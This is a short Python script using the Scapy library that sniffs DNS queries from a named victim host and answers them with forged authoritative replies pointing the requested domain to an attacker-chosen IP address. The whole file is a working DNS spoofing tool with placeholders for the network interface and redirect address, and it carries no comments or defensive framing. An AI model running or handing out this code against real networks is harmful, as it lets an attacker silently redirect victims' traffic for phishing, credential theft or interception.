from scapy.all import *

net_interface = "Choose the interface"

packet_filter = " and ".join([
    "udp dst port 53",
    "src host ip_victim"
    ])

def dns_reply(packet):

        eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)

        ip = IP(src=packet[IP].dst, dst=packet[IP].src)

        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)

        dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1,
        nscount=0, arcount=0, ar=DNSRR(rrname=packet[DNS].qd.qname, type='A', ttl=600, rdata='Choose the ip destination'))

        response_packet = eth / ip / udp / dns
        sendp(response_packet, iface=net_interface)

sniff(filter=packet_filter, prn=dns_reply, store=0, iface=net_interface, count=1)
